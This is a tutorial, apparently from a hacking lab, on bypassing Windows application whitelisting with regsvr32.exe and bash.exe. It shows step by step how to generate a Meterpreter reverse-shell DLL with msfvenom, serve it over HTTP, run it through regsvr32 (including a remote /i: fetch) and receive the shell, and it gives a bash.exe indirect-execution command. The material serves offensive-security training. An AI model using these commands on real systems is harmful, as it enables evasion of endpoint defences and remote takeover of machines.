# Bypassing Application Whitelisting

Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. It is rule-based, specifying a list of approved applications or executable files allowed to run on an operating system. This section focuses on LOLBAS (Living Off the Land Binaries and Scripts) examples used to bypass Windows application whitelisting.

---

## Regsvr32

**Regsvr32** is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs) in the Windows Registry. The binary is located at:

- `C:\Windows\System32\regsvr32.exe` (32-bit)
- `C:\Windows\SysWOW64\regsvr32.exe` (64-bit)

Besides its intended use, `regsvr32.exe` can be abused to execute arbitrary binaries and bypass Windows Application Whitelisting. According to Red Canary, it is the third most popular ATT&CK technique. Adversaries leverage `regsvr32.exe` to execute native code or scripts locally or remotely, often in memory, making it effective for bypassing whitelisting.

### Example: Using Regsvr32 to Execute a Malicious DLL

1. **Generate a malicious DLL payload:**

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
    ```

2. **Set up a Metasploit listener:**

    ```bash
    msfconsole -q
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST ATTACKBOX_IP
    msf6 exploit(multi/handler) > set LPORT 443
    msf6 exploit(multi/handler) > exploit
    ```

3. **Serve the DLL file via a web server:**

    ```bash
    python3 -m http.server 1337
    ```

4. **On the victim machine, download and execute the DLL:**

    ```cmd
    C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
    ```

    Or, using a more advanced command:

    ```cmd
    C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
    ```

    - `/s`: Silent mode (no messages)
    - `/n`: Do not call DLLRegisterServer
    - `/i:`: Use another server (with `/n`)
    - `/u`: Run with unregister method

5. **On the attacking machine, receive the reverse shell:**

    ```
    [*] Started reverse TCP handler on ATTACKBOX_IP:443
    [*] Sending stage (175174 bytes) to 10.10.159.197
    [*] Meterpreter session 1 opened (ATTACKBOX_IP:443 -> 10.10.159.197:52845)
    ```

> **Note:** For a 64-bit DLL, specify the architecture in `msfvenom` and use the 64-bit version of `regsvr32.exe` (`C:\Windows\SysWOW64\regsvr32.exe`).

---

## Bourne Again Shell (Bash)

Since 2016, Microsoft has supported the Linux environment on Windows 10, 11, and Server 2019 via Windows Subsystem for Linux (WSL). WSL allows users to run a Linux distribution on Windows, and `bash.exe` is the tool for interacting with this environment.

Attackers can abuse `bash.exe` (a Microsoft-signed binary) to execute payloads and bypass application whitelisting:

```bash
bash.exe -c "path-to-payload"
```

This is known as an **Indirect Command Execution** technique (see [ATT&CK T1202](https://attack.mitre.org/techniques/T1202/)), where Windows utilities are abused to obtain command execution.

> **Note:** WSL must be enabled and installed to use `bash.exe`. Some virtual machines may not support WSL due to nested virtualization restrictions.

---

## Further Reading

For more information on LOLBAS tools, visit the [LOLBAS project website](https://lolbas-project.github.io/).
